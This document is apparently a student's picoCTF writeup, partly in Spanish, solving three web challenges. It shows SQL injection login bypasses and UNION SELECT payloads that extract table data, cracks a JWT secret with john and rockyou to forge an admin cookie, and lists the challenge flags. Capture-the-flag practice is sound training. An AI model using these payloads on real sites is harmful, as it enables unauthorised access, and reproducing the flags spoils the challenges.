#  01 Irish-Name-Repo 1
# DESC
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
# SOLUCION
username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
````` python

picoCTF{s0m3_SQL_f8adf3fb}
````` 


#  2 More SQLi
# DESC
#### Description

Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

# SOLUCION
ME LOGE CON ADMIN
PASSWORD ' or 1 == 1;'
USE ESTOS COMANDOS 
Algiers' union SELECT sql,2,3 from sqlite_master;
'union select id,flag,3 from more_table;

````` python
|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}|3|
|2|If you are here, you must have seen it|
````` 




#  03 - JaWT Scratchpad
# DESC

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210
# SOLUCION


Usamos este comando para usar el ataque de diccionario en el jwt que tenemos
john hash -w-/usr/share/wordlists/rockyou.txt

y este comando os da la palabra ilovepico 
 y despues usamos las cookies las metemos a jet.io y cambiamos el usuario de jhn por admin y refrescamos y listo 
 
 ````` python

picoCTF{jawt_was_just_what_you_thought_44c752f5}
````` 




#  0
# DESC


# SOLUCION

````` python

````` 
